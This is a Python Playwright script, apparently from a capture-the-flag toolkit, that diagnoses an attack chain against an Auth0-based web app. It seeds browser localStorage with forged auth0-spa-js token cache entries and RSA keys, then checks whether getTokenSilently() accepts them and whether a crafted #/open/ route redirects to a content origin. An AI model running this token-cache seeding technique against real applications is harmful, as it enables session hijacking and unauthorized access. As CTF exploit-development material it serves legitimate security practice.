#!/usr/bin/env python3
"""
Diagnose why a seeded auth0-spa-js cache doesn't satisfy getTokenSilently().

payval.py seeds localStorage and the iframe still gets redirected to Auth0
(loads=2, maxlen=1). That's either (a) the cache key/value shape is wrong, or
(b) something iframe-specific. This separates the two by driving the app origin
as a TOP-LEVEL page, which removes every iframe variable, and by asking
auth0-spa-js itself what it thinks rather than inferring from navigations.

Run: $HOME/ctf-tools/venv/bin/python seeddiag.py
"""

import json
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import ari
import docs
import payval

CHROME = os.path.expanduser("~/ctf-tools/chrome/chrome")
APP = "https://ariadnetab.xyz"


def main():
    state = ari.load_state()
    grant = ari.get_token(state["email"], state["password"])
    token = grant["access_token"]
    scope = grant.get("scope") or "openid profile email"
    state["access_token"] = token
    ari.save_state(state)
    keys = docs.ensure_keys(state)

    target, _ = docs.upload(state, "seeddiag.txt", "text/plain", b"SEEDDIAG-OK")
    print("[*] owned target %s" % target["id"])

    from playwright.sync_api import sync_playwright

    with sync_playwright() as pw:
        browser = pw.chromium.launch(executable_path=CHROME, headless=True,
                                     args=["--no-sandbox", "--disable-dev-shm-usage"])
        page = browser.new_context().new_page()
        page.on("console", lambda m: print("    [console] %s" % m.text[:200]))
        page.on("framenavigated",
                lambda f: print("    [nav] %s" % f.url[:120]) if f == page.main_frame else None)

        page.goto(APP + "/", wait_until="domcontentloaded")
        page.evaluate(
            "([priv, pub, entries]) => {"
            "  localStorage.setItem('rsaPrivateKeyPkcs8', priv);"
            "  localStorage.setItem('rsaPublicKeySpki', pub);"
            "  for (const [k, v] of entries) localStorage.setItem(k, v);"
            "}",
            [keys["privateKey"], keys["publicKey"],
             payval.auth0_cache_entries(token, scope)],
        )

        # Ask auth0-spa-js directly, in the page, with exactly app.js's options.
        print("\n[*] asking auth0-spa-js whether it can serve the seeded token")
        probe = page.evaluate("""async () => {
          const cfg = window.DOCUMENTS_CONFIG;
          await new Promise((res, rej) => {
            const s = document.createElement('script');
            s.src = 'https://cdn.auth0.com/js/auth0-spa-js/2.24/auth0-spa-js.production.js';
            s.onload = res; s.onerror = rej; document.head.appendChild(s);
          });
          const client = await window.auth0.createAuth0Client({
            domain: cfg.auth0Domain, clientId: cfg.auth0ClientId,
            authorizationParams: { audience: cfg.auth0Audience, redirect_uri: location.origin + '/' },
            cacheLocation: 'localstorage', useRefreshTokens: false
          });
          const out = { cfg: cfg, keys: Object.keys(localStorage) };
          try { const t = await client.getTokenSilently(); out.token = t ? ('len' + t.length) : String(t); }
          catch (e) { out.error = String(e); }
          return out;
        }""")
        print("    config     : %s" % json.dumps(probe.get("cfg")))
        print("    ls keys    : %s" % probe.get("keys"))
        print("    token      : %s" % probe.get("token"))
        print("    error      : %s" % probe.get("error"))

        print("\n[*] top-level navigation to #/open/<owned id>")
        page.goto(APP + "/#/open/" + target["id"], wait_until="domcontentloaded")
        for _ in range(25):
            page.wait_for_timeout(1000)
            if page.url.startswith("https://content."):
                break
        print("    final url  : %s" % page.url[:160])
        try:
            print("    status text: %s" % page.inner_text("#status")[:120])
        except Exception:
            pass
        print("    VERDICT    : %s" % ("SEED WORKS, chain runs top-level"
                                       if page.url.startswith("https://content.")
                                       else "seed did NOT satisfy getTokenSilently"))
        browser.close()


if __name__ == "__main__":
    main()
